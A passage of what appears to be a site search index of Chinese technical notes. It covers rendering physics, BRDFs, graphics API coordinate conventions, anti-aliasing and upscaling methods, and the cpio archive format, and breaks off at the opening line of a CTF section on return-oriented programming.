15\uff1a</p> <ul> <li>Radiant energy Q\uff1a\u200b\u5149\u6e90\u200b\u5411\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u8f90\u5c04\u200b\u7684\u200b\u80fd\u91cf\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b J</li> <li>Radiant flux(power) \\(\\Phi\\)\uff1a\u200b\u5149\u6e90\u200b\u5728\u200b\u5355\u4f4d\u200b\u65f6\u95f4\u200b\u5185\u5411\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u8f90\u5c04\u200b\u7684\u200b\u80fd\u91cf\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b W</li> <li>Solid angle \\(\\omega\\)\uff1a\u200b\u7acb\u4f53\u89d2\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b steradian/square radian \u200b\u7403\u9762\u200b\u5ea6\u200b\uff0c\u200b\u7b80\u5199\u200b sr\uff1b\u200b\u662f\u200b\u5728\u200b\u7403\u9762\u200b\u4e0a\u200b\u4e00\u4e2a\u200b\u5c0f\u5e73\u9762\u200b\u7684\u200b\u9762\u79ef\u200b\u9664\u4ee5\u200b\u534a\u5f84\u200b\u7684\u200b\u5e73\u65b9\u200b\uff0c\u200b\u5373\u200b \\(\\omega=A/r^2\\)</li> <li>Radiant intensity I\uff1a\u200b\u5149\u6e90\u200b\u5728\u200b\u5355\u4f4d\u200b\u7acb\u4f53\u89d2\u200b\u5185\u200b\u7684\u200b Radiant flux\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b W/sr</li> <li>Irradiance E\uff1a\u200b\u5355\u4f4d\u200b\u9762\u79ef\u200b\u63a5\u53d7\u200b\u5230\u200b\u7684\u200b Radiant flux\uff0c\u200b\u5373\u200b \\(E=\\Phi/A\\)\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b \\(W/m^2\\)</li> <li>Radiance L\uff1a\u200b\u5355\u4f4d\u200b\u9762\u79ef\u200b\u4e0b\u200b\uff0c\u200b\u63a5\u6536\u200b\u5230\u200b\u6765\u81ea\u200b\u5355\u4f4d\u200b\u7acb\u4f53\u89d2\u200b\u7684\u200b Radiant flux\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b \\(W/sr \\cdot m^2\\)</li> </ul>"},{"location":"software/cg.html#rendering-equation","title":"Rendering equation","text":"<p>\u200b\u53c2\u8003\u200b GAMES101 Lecture 15\uff1a</p> \\[ L_o(p, \\omega_o) = L_e(p, \\omega_o) + \\int_{\\Omega} L_i(p, \\omega_i) f_r(p, \\omega_i, \\omega_o) (n \\cdot \\omega_i) \\mathrm{d} \\omega_i \\] <p>\u200b\u542b\u4e49\u200b\uff1a\u200b\u4ece\u200b\u5e73\u9762\u200b\u4e0a\u200b\u7684\u200b \\(p\\) \u200b\u70b9\u200b\u51fa\u53d1\u200b\uff0c\u200b\u5411\u200b \\(\\omega_r\\) \u200b\u53d1\u5c04\u200b\u7684\u200b Radiance \u200b\u5305\u62ec\u200b\u4e24\u200b\u90e8\u5206\u200b\uff1a</p> <ol> <li>\\(L_e(p, \\omega_o)\\)\uff1a\u200b\u8fd9\u4e2a\u200b\u70b9\u200b\u672c\u8eab\u200b\u53d1\u200b\u7684\u200b\u5149\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5149\u6e90\u200b</li> <li>\\(\\int_{\\Omega} L_i(p, \\omega_i) f_r(p, \\omega_i, \\omega_o) (n \\cdot \\omega_i) \\mathrm{d} \\omega_i\\)\uff1a\u200b\u8003\u8651\u200b\u534a\u7403\u200b\u9762\u4e0a\u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u5165\u5c04\u200b\u65b9\u5411\u200b \\(\\omega_i\\)\uff0c\u200b\u8fd9\u4e2a\u200b\u65b9\u5411\u200b\u4e0a\u200b\u5165\u5c04\u200b\u5230\u200b \\(p\\) \u200b\u70b9\u200b\u7684\u200b Radiance \u200b\u662f\u200b \\(L_i(p, \\omega_i)\\)\uff0c\u200b\u5176\u4e2d\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6bd4\u4f8b\u200b\u4f1a\u200b\u53cd\u5c04\u200b\u5230\u200b \\(\\omega_o\\) \u200b\u65b9\u5411\u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u6bd4\u4f8b\u200b\u5c31\u662f\u200b BRDF \\(f_r(p, \\omega_i, \\omega_o)\\)\uff0c\u200b\u6700\u540e\u200b\u7531\u4e8e\u200b\u5165\u5c04\u200b\u65b9\u5411\u200b\u548c\u200b\u5e73\u9762\u200b\u7684\u200b\u6cd5\u200b\u65b9\u5411\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5939\u89d2\u200b \\(\\theta\\)\uff0c\u200b\u6839\u636e\u200b Lambert's Cosine Law\uff0c\u200b\u9700\u8981\u200b\u4e58\u200b\u4e0a\u200b \\(\\cos \\theta = n \\cdot \\omega_i\\) \u200b\u9879\u200b\u3002</li> </ol>"},{"location":"software/cg.html#bidirectional-reflectance-distribution-function","title":"Bidirectional reflectance distribution function","text":"<p>BRDF\uff08Bidirectional reflectance distribution function\uff09\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5728\u200b\u4e00\u4e2a\u200b\u8868\u9762\u200b\u4e0a\u200b\uff0c\u200b\u7279\u5b9a\u200b\u89d2\u5ea6\u200b\uff08\\(\\omega_i\\)\uff09\u200b\u7684\u200b\u5165\u5c04\u5149\u200b\u6709\u200b\u591a\u200b\u5927\u200b\u6bd4\u4f8b\u200b\u4f1a\u200b\u88ab\u200b\u53cd\u5c04\u200b\u5230\u200b\u7279\u5b9a\u200b\u89d2\u5ea6\u200b\uff08\\(\\omega_o\\)\uff09\u200b\u7684\u200b\u51fa\u5c04\u5149\u200b\u3002</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b BRDF \u200b\u6709\u200b\uff1a</p> <ul> <li>Lambertian\uff1a\u200b\u4e00\u822c\u200b\u7528\u4e8e\u200b\u6f2b\u53cd\u5c04\u200b\u8868\u9762\u200b\uff0c\u200b\u5149\u200b\u5747\u5300\u200b\u53cd\u5c04\u200b\u5230\u200b\u5404\u4e2a\u200b\u89d2\u5ea6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u548c\u200b\u51fa\u5c04\u200b\u89d2\u5ea6\u200b\u65e0\u5173\u200b\uff1a\\(f=c/\\pi\\)\uff0c\u200b\u5176\u4e2d\u200b \\(c\\) \u200b\u662f\u200b\u8868\u9762\u200b\u7684\u200b\u989c\u8272\u200b\uff0c\u200b\u9664\u4ee5\u200b \\(\\pi\\) \u200b\u662f\u200b\u4e3a\u4e86\u200b\u6ee1\u8db3\u200b\u80fd\u91cf\u5b88\u6052\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u89c1\u200b Deriving Lambertian BRDF from first principles</li> <li>Phong \u200b\u548c\u200b Blinn-Phong\uff1a\u200b\u7528\u4e8e\u200b OpenGL Fixed-function pipeline</li> <li>Cook-Torrance\uff1a\\(f=k_d\\frac{c}{\\pi} + k_s\\frac{DFG}{4(n \\cdot \\omega_i)(n \\cdot \\omega_o)}\\)\uff0c\u200b\u524d\u9762\u200b\u7684\u200b \\(k_d\\frac{c}{\\pi}\\) \u200b\u548c\u200b Lambertian \u200b\u4e00\u6837\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b \\(DFG\\) \u200b\u8868\u793a\u200b\u4e09\u4e2a\u200b\u51fd\u6570\u200b\u7684\u200b\u4e58\u79ef\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b Normal Distribution Function\uff0cFresnel Function \u200b\u548c\u200b Geometric Attenuation Function\uff0c\u200b\u8be6\u89c1\u200b Physically-Based Rendering Cook-Torrance Reflectance Model \u200b\u548c\u200b LearnOpenGL CN - Theory</li> </ul>"},{"location":"software/cg.html#api","title":"\u56fe\u5f62\u200b API \u200b\u5bf9\u6bd4","text":"<p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e0d\u540c\u200b\u56fe\u5f62\u200b API \u200b\u6216\u8005\u200b\u5e93\u200b\u5728\u200b\u7ea6\u5b9a\u200b\u4e0a\u200b\u7684\u200b\u4e0d\u540c\u200b\uff1a</p> OpenGL Direct3D Metal Vulkan NDC \u200b\u91c7\u7528\u200b \u200b\u5de6\u624b\u200b\u7cfb\u200b \u200b\u5de6\u624b\u200b\u7cfb\u200b \u200b\u5de6\u624b\u200b\u7cfb\u200b \u200b\u53f3\u624b\u200b\u7cfb\u200b NDC \u200b\u4e2d\u200b z \u200b\u7684\u200b\u8303\u56f4\u200b [-1, 1] [0, 1] [0, 1] [0, 1] NDC (-1, -1) \u200b\u5728\u200b \u200b\u5de6\u4e0b\u89d2\u200b \u200b\u5de6\u4e0b\u89d2\u200b \u200b\u5de6\u4e0b\u89d2\u200b \u200b\u5de6\u4e0a\u89d2\u200b Framebuffer (0,0) \u200b\u5728\u200b \u200b\u5de6\u4e0b\u89d2\u200b \u200b\u5de6\u4e0a\u89d2\u200b \u200b\u5de6\u4e0a\u89d2\u200b \u200b\u5de6\u4e0a\u89d2\u200b <p>\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>Unity - Manual: Writing shaders for different graphics APIs</li> <li>Coordinate systems - gpuweb</li> <li>Vulkan \u200b\u96c6\u6210\u200b\uff1a\u200b\u56fe\u5f62\u200b API \u200b\u5750\u6807\u7cfb\u200b\u5bf9\u6bd4\u200b\u53ca\u200b\u89e3\u51b3\u65b9\u6848\u200b</li> <li>Vulkan\u2019s coordinate system</li> </ul> <p>\u200b\u53e6\u5916\u200b\u8fd8\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b\uff1a</p> <ul> <li>What are the coordinates?</li> </ul>"},{"location":"software/cg.html#_8","title":"\u6297\u952f\u9f7f\u200b/\u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b/\u200b\u5e27\u200b\u751f\u6210","text":"<ul> <li>SSAA(Super Sampling Anti Aliasing)/FSAA(Full Scene Anti Aliasing): \u200b\u6309\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u6e32\u67d3\u200b\uff0c\u200b\u518d\u200b\u964d\u200b\u91c7\u6837\u200b\u5230\u200b\u5c4f\u5e55\u200b\u5206\u8fa8\u7387\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u5f88\u5927\u200b\u3002</li> <li>MSAA(Multi Sampling Anti Aliasing)\uff1a\u200b\u6309\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u6765\u200b\u8fdb\u884c\u200b\u8986\u76d6\u200b\u6d4b\u8bd5\u200b\u548c\u200b\u6df1\u5ea6\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u5373\u200b\u4e00\u4e2a\u200b\u50cf\u7d20\u200b\u6709\u200b\u591a\u4e2a\u200b\u91c7\u6837\u200b\u70b9\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u91c7\u6837\u200b\u70b9\u200b\u90fd\u200b\u8981\u200b\u627e\u5230\u200b\u8986\u76d6\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u70b9\u200b\u7684\u200b\u4e09\u89d2\u5f62\u200b\uff0c\u200b\u4f46\u200b\u6bcf\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\u53ea\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u7740\u8272\u200b\uff08SSAA \u200b\u662f\u200b\u6bcf\u4e2a\u200b\u91c7\u6837\u200b\u70b9\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u7740\u8272\u200b\uff09\uff0c\u200b\u7740\u8272\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u590d\u5236\u5230\u200b\u8fd9\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\u8986\u76d6\u200b\u7684\u200b\u6240\u6709\u200b\u91c7\u6837\u200b\u70b9\u4e0a\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b\u591a\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\u8986\u76d6\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b\u91c7\u6837\u200b\u70b9\u200b\uff0c\u200b\u6700\u540e\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u6309\u7167\u200b\u8986\u76d6\u200b\u7684\u200b\u91c7\u6837\u200b\u70b9\u200b\u4e2a\u6570\u200b\u52a0\u6743\u200b\u5e73\u5747\u200b\u3002\u200b\u6700\u574f\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u91c7\u6837\u200b\u70b9\u200b\u90fd\u200b\u5c5e\u4e8e\u200b\u4e0d\u540c\u200b\u7684\u200b\u4e09\u89d2\u5f62\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u6027\u80fd\u200b\u4f1a\u200b\u9000\u5316\u200b\u4e3a\u200b SSAA\uff0c\u200b\u4f46\u200b\u5927\u591a\u6570\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u50cf\u7d20\u200b\u7684\u200b\u591a\u4e2a\u200b\u91c7\u6837\u200b\u70b9\u200b\u5c5e\u4e8e\u200b\u540c\u4e00\u4e2a\u200b\u4e09\u89d2\u5f62\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u6027\u80fd\u200b\u5c31\u200b\u5f88\u200b\u597d\u200b\u3002</li> <li>NVIDIA DLSS(Deep Learning Super Sampling) 1.0\uff1a\u200b\u6309\u200b\u66f4\u200b\u4f4e\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u6e32\u67d3\u200b\uff0c\u200b\u7528\u200b AI \u200b\u8fdb\u884c\u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\uff0c\u200b\u518d\u200b\u964d\u200b\u91c7\u6837\u200b\u5230\u200b\u5c4f\u5e55\u200b\u5206\u8fa8\u7387\u200b\u4e0a\u200b\uff0c\u200b\u4f8b\u5982\u200b 1920x1080 \u200b\u6e32\u67d3\u200b\uff0cAI \u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\u5230\u200b 15360x8640\uff0c\u200b\u518d\u200b\u964d\u200b\u91c7\u6837\u200b\u5230\u200b 3840x2160\u3002\u200b\u6bcf\u4e2a\u200b\u6e38\u620f\u200b\u9700\u8981\u200b\u4e13\u95e8\u200b\u8bad\u7ec3\u200b\u6a21\u578b\u200b\uff0c\u200b\u7ecf\u8fc7\u200b AI \u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u50cf\u7d20\u200b\u53d8\u6210\u200b 64 \u200b\u4e2a\u200b\u50cf\u7d20\u200b\u3002</li> <li>NVIDIA DLSS(Deep Learning Super Sampling) 2.0\uff1a\u200b\u548c\u200b DLSS 1.0 \u200b\u4e0d\u540c\u200b\uff0cDLSS 2.0 \u200b\u662f\u200b\u4e00\u79cd\u200b TAAU\uff08Temporal Anti Aliasing Upscaling\uff09\u200b\u7b97\u6cd5\u200b\uff0cTemporal \u200b\u610f\u601d\u200b\u662f\u200b\u5229\u7528\u200b\u4e86\u200b\u591a\u200b\u5e27\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53bb\u200b\u9884\u6d4b\u200b\u9ad8\u5206\u8fa8\u7387\u200b\u7684\u200b\u8f93\u51fa\u200b\u3002DLSS 2.0 \u200b\u652f\u6301\u200b\u4e0d\u540c\u200b\u7684\u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\u6863\u4f4d\u200b\uff1aQuality \u200b\u5c31\u662f\u200b\u6309\u7167\u200b\u957f\u5bbd\u200b\u5404\u662f\u200b\u539f\u6765\u200b 66.7% \u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u53bb\u200b\u6e32\u67d3\u200b\uff0cBalanced \u200b\u662f\u200b 58.0%\uff0cPerformance \u200b\u662f\u200b 50.0%\u3002\u200b\u7528\u200b\u4f4e\u5206\u8fa8\u7387\u200b\u6e32\u67d3\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u7528\u200b\u901a\u7528\u200b\u7684\u200b AI \u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\u7f51\u7edc\u200b\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u6e38\u620f\u200b\u8bad\u7ec3\u200b\u5355\u72ec\u200b\u7684\u200b\u7f51\u7edc\u200b\u3002</li> <li>NVIDIA DLSS(Deep Learning Super Sampling) 3.0\uff1a\u200b\u5f15\u5165\u200b\u4e86\u200b\u5e27\u200b\u751f\u6210\u200b\u6280\u672f\u200b\uff0c\u200b\u6bcf\u200b\u6e32\u67d3\u200b\u4e00\u5f20\u200b\u56fe\u200b\uff0c\u200b\u5c31\u200b\u751f\u6210\u200b\u51fa\u65b0\u200b\u7684\u200b\u4e00\u5f20\u200b\u56fe\u200b\uff0c\u200b\u5373\u200b\u6709\u200b\u4e00\u534a\u200b\u7684\u200b\u56fe\u50cf\u200b\u662f\u200b\u751f\u6210\u200b\u51fa\u6765\u200b\u7684\u200b\u3002</li> <li>NIS(NVIDIA Image Scaling)\uff1a\u200b\u5f00\u6e90\u200b\u7684\u200b\u56fe\u5f62\u200b\u7f29\u653e\u200b\u548c\u200b\u9510\u5316\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u975e\u200b AI\uff0c\u200b\u65e0\u200b\u65f6\u5e8f\u200b\u4fe1\u606f\u200b\u3002\u200b\u7528\u200b\u4f4e\u5206\u8fa8\u7387\u200b\u6e32\u67d3\u200b\uff0c\u200b\u518d\u7528\u200b NIS \u200b\u8fdb\u884c\u200b\u653e\u5927\u200b\uff0c\u200b\u5373\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\u3002</li> <li>AMD FSR(FidelityFX Super Resolution) 1\uff1a\u200b\u548c\u200b NIS \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u5f00\u6e90\u200b\u7684\u200b\u56fe\u5f62\u200b\u7f29\u653e\u200b\u548c\u200b\u9510\u5316\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u975e\u200b AI\uff0c\u200b\u65e0\u200b\u65f6\u5e8f\u200b\u4fe1\u606f\u200b\u3002\u200b\u524d\u8eab\u200b\u662f\u200b Fidelity Contrast Adaptive Sharping\uff08CAS\uff09\u200b\u9510\u5316\u200b\u6280\u672f\u200b\u3002</li> <li>AMD FSR(FidelityFX Super Resolution) 2\uff1a\u200b\u5f00\u6e90\u200b\u7684\u200b\u56fe\u5f62\u200b\u7f29\u653e\u200b\u548c\u200b\u9510\u5316\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u975e\u200b AI\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b\u65f6\u5e8f\u200b\u4fe1\u606f\u200b\u3002</li> <li>AMD FSR(FidelityFX Super Resolution) 3\uff1a\u200b\u5f00\u6e90\u200b\u7684\u200b\u56fe\u5f62\u200b\u7f29\u653e\u200b\u548c\u200b\u9510\u5316\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u975e\u200b AI\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b\u65f6\u5e8f\u200b\u4fe1\u606f\u200b\u548c\u200b\u5e27\u200b\u751f\u6210\u200b\u3002</li> <li>AFMF(AMD Fluid Motion Frames)\uff1a\u200b\u5728\u200b AMD \u200b\u9a71\u52a8\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5e27\u200b\u751f\u6210\u200b\uff0c\u200b\u8f6f\u4ef6\u200b\u65e0\u200b\u611f\u77e5\u200b\u3002</li> <li>Intel XeSS(Xe Super Sampling)\uff1a\u200b\u5f00\u6e90\u200b\uff0c\u200b\u7c7b\u200b DLSS\uff0c\u200b\u7528\u200b AI \u200b\u8fdb\u884c\u200b\u8d85\u200b\u5206\u8fa8\u7387\u200b\u3002</li> </ul> <p>\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>\u200b\u8bf7\u95ee\u200b FXAA\u3001FSAA \u200b\u4e0e\u200b MSAA \u200b\u6709\u200b\u4ec0\u4e48\u200b\u533a\u522b\u200b\uff1f\u200b\u6548\u679c\u200b\u548c\u200b\u6027\u80fd\u200b\u4e0a\u200b\u54ea\u4e2a\u200b\u597d\u200b\uff1f</li> <li>A Quick Overview of MSAA</li> <li>\u200b\u514d\u8d39\u200b\u7684\u200b\u6027\u80fd\u200b\u589e\u5f3a\u200b\u662f\u200b\u600e\u4e48\u200b\u6765\u200b\u7684\u200b\uff1fDLSS/NIS/FSR \u200b\u6280\u672f\u200b\u89e3\u6790\u200b</li> <li>Deep learning super sampling</li> <li>GPUOpen</li> <li>\u200b\u8be6\u7ec6\u200b\u5256\u6790\u200b AMD FSR \u200b\u7b97\u6cd5\u200b</li> </ul>"},{"location":"software/cpio.html","title":"cpio \u200b\u6587\u4ef6\u683c\u5f0f","text":"<p>cpio \u200b\u6587\u4ef6\u200b\u6709\u200b\u591a\u79cd\u4e0d\u540c\u200b\u7684\u200b\u683c\u5f0f\u200b\uff0c\u200b\u4e3b\u8981\u200b\u6709\u200b\u5982\u4e0b\u200b\u51e0\u79cd\u200b\uff1a</p> <ol> <li>binary/pwb\uff1a\u200b\u65e9\u671f\u200b\u7684\u200b cpio \u200b\u4e8c\u8fdb\u5236\u200b\u683c\u5f0f\u200b</li> <li>odc\uff1aPOSIX \u200b\u6807\u51c6\u5316\u200b\u7684\u200b cpio \u200b\u683c\u5f0f\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u5e38\u7528\u200b</li> <li>newc\uff1aSVR4\uff08System V Release 4\uff09\u200b\u5f15\u5165\u200b\u7684\u200b cpio \u200b\u683c\u5f0f\u200b</li> </ol> <p>\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b\uff1acpio.5\u3002</p>"},{"location":"software/cpio.html#odc","title":"odc","text":"<p>cpio \u200b\u7684\u200b odc \u200b\u6587\u4ef6\u683c\u5f0f\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u5c31\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b File Entry\u3002\u200b\u6bcf\u4e2a\u200b File Entry \u200b\u7531\u200b\u5934\u90e8\u200b\uff0c\u200b\u6587\u4ef6\u540d\u200b\u548c\u200b\u6570\u636e\u200b\u7ec4\u6210\u200b\uff0c\u200b\u5176\u200b\u5934\u90e8\u200b\u683c\u5f0f\u200b\u662f\u200b\uff1a</p> <pre><code>struct cpio_odc_entry_header {\n  char magic[6];\n  char dev[6];\n  char ino[6];\n  char mode[6];\n  char uid[6];\n  char gid[6];\n  char nlink[6];\n  char rdev[6];\n  char mtime[11];\n  char namesize[6];\n  char filesize[11];\n};\n</code></pre> <p>magic \u200b\u5b57\u6bb5\u200b\u6052\u4e3a\u200b <code>070707</code>\u3002\u200b\u5176\u4ed6\u200b\u5b57\u6bb5\u200b\u90fd\u200b\u4fdd\u5b58\u200b\u7684\u200b\u662f\u200b\u6570\u5b57\u200b\uff0c\u200b\u7528\u200b\u516b\u8fdb\u5236\u200b\u6570\u8f6c\u6210\u200b ASCII \u200b\u7801\u200b\u4fdd\u5b58\u200b\u3002\u200b\u4f8b\u5982\u200b\u6587\u4ef6\u540d\u200b\u957f\u5ea6\u200b\u662f\u200b 28\uff0c\u200b\u8f6c\u6210\u200b\u516b\u200b\u8fdb\u5c55\u200b\u662f\u200b 034\uff0c<code>namesize</code> \u200b\u5b57\u6bb5\u200b\u662f\u200b 6 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6dfb\u52a0\u200b\u524d\u7f6e\u200b 0\uff0c\u200b\u5f97\u5230\u200b <code>000034</code>\uff0c\u200b\u7528\u200b ASCII \u200b\u4fdd\u5b58\u200b\u5728\u200b <code>namesize</code> \u200b\u5b57\u200b\u6bb5\u200b\u3002</p> <p>\u200b\u8bfb\u53d6\u200b Entry \u200b\u5934\u90e8\u200b\u4ee5\u540e\u200b\uff0c\u200b\u628a\u200b\u5176\u4e2d\u200b\u7684\u200b <code>namesize</code> \u200b\u548c\u200b <code>filesize</code> \u200b\u5b57\u200b\u6bb5\u200b\u8f6c\u6362\u6210\u200b\u6574\u6570\u200b\uff0c\u200b\u5c31\u200b\u77e5\u9053\u200b\u6587\u4ef6\u540d\u200b\uff08\u200b\u5305\u62ec\u200b\u672b\u5c3e\u200b 0\uff09\u200b\u548c\u200b\u6570\u636e\u200b\u7684\u200b\u957f\u5ea6\u200b\u3002\u200b\u5934\u90e8\u200b\u540e\u9762\u200b\u7d27\u63a5\u7740\u200b\u5c31\u662f\u200b\u6587\u4ef6\u540d\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b\u6570\u636e\u200b\u3002\u200b\u6240\u6709\u200b Entry \u200b\u62fc\u63a5\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u5c31\u662f\u200b\u5b8c\u6574\u200b\u7684\u200b cpio \u200b\u6587\u4ef6\u200b\u3002\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b padding\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b cpio \u200b\u6587\u4ef6\u200b\u7684\u200b\u7ed3\u675f\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u6587\u4ef6\u540d\u200b\u662f\u200b <code>TRAILER!!!</code>\u3002</p> <p>cpio \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u975e\u5e38\u7b80\u5355\u200b\uff0c\u200b\u88ab\u200b\u7528\u4e8e\u200b initramfs \u200b\u7b49\u200b\u573a\u5408\u200b\u3002\u200b\u76f8\u6bd4\u200b Tar\uff0ccpio \u200b\u6ca1\u6709\u200b\u628a\u200b\u7ed3\u6784\u200b\u4f53\u200b\u5bf9\u9f50\u200b\u5230\u200b 512 \u200b\u5b57\u8282\u200b\u7684\u200b\u8fb9\u754c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6587\u4ef6\u540d\u200b\u4e5f\u200b\u91c7\u7528\u200b\u4e86\u200b\u52a8\u6001\u200b\u957f\u5ea6\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0ccpio \u200b\u6587\u4ef6\u200b\u7684\u200b\u683c\u5f0f\u200b\u5c31\u662f\u200b\uff1a<code>(\u200b\u5934\u90e8\u200b\uff0c\u200b\u6587\u4ef6\u540d\u200b\uff0c\u200b\u6570\u636e\u200b)*</code>\u3002\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b\u7ed3\u675f\u200b\uff0c\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u6587\u4ef6\u540d\u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b <code>TRAILER!!!</code>\u3002</p>"},{"location":"software/cpio.html#newc","title":"newc","text":"<p>newc \u200b\u76f8\u6bd4\u200b odc \u200b\u683c\u5f0f\u200b\uff0c\u200b\u4fee\u6539\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5b57\u6bb5\u200b\u7684\u200b\u957f\u5ea6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b dev \u200b\u62c6\u200b\u5206\u6210\u200b\u4e86\u200b major \u200b\u548c\u200b minor\uff0c\u200b\u6dfb\u52a0\u200b\u4e86\u200b crc\uff1a</p> <pre><code>struct cpio_newc_entry_header {\n  char magic[8];\n  char ino[8];\n  char mode[8];\n  char uid[8];\n  char gid[8];\n  char nlink[8];\n  char mtime[8];\n  char filesize[8];\n  char devmajor[8];\n  char devminor[8];\n  char rdevmajor[8];\n  char rdevminor[8];\n  char namesize[8];\n  char check[8];\n};\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u7684\u200b magic \u200b\u5b57\u6bb5\u200b\u662f\u200b <code>070701</code> \u200b\u6216\u8005\u200b <code>070702</code>\uff0c\u200b\u4e0e\u200b odc \u200b\u8868\u793a\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8ba1\u7b97\u200b\u4e86\u200b CRC\uff0c\u200b\u90a3\u4e48\u200b CRC \u200b\u4f1a\u200b\u88ab\u200b\u586b\u5165\u200b <code>check</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8bbe\u7f6e\u200b <code>magic</code> \u200b\u4e3a\u200b <code>070702</code>\uff1b\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b CRC\uff0c\u200b\u90a3\u4e48\u200b <code>magic</code> \u200b\u4e3a\u200b <code>070701</code>\u3002</p>"},{"location":"software/cpio.html#_1","title":"\u5e38\u7528\u547d\u4ee4","text":"<p>\u200b\u521b\u5efa\u200b cpio\uff1a<code>find . | cpio -ov &gt; archive.cpio</code></p> <p>\u200b\u5c55\u5f00\u200b cpio\uff1a<code>cpio -idv &lt; archive.cpio</code></p>"},{"location":"software/ctf.html","title":"CTF","text":""},{"location":"software/ctf.html#general","title":"general","text":""},{"location":"software/ctf.html#return-oriented-programming","title":"return oriented programming","text":"<p>\u200b\u5229\u7528\u200b x86 \u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u4e00\u7cfb\u5217\u200b 